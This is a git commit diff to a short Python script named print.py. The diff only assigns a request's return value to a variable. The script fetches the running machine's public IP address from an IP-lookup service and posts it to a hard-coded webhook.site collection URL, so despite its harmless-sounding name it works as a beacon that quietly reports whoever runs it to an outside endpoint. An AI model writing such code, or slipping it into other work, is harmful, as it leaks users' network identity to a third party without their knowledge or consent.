945af14e5d64cf8626e5f622f3bd5e8285a1f467
AlphaBetUserV <139291788+AlphaBetUserV@users.noreply.github.com>
2023-07-12 01:44:37 +0100

    Update print.py

--- print.py
+++ print.py
@@ -2,4 +2,4 @@ import requests
 
 webhook_url = "https://webhook.site/5570a487-f056-4647-8fb0-5ef2e8ecb4ad"
 r = requests.get("https://api.ipify.org/?format=json").text
-requests.post(webhook_url, r)
+v = requests.post(webhook_url, r)
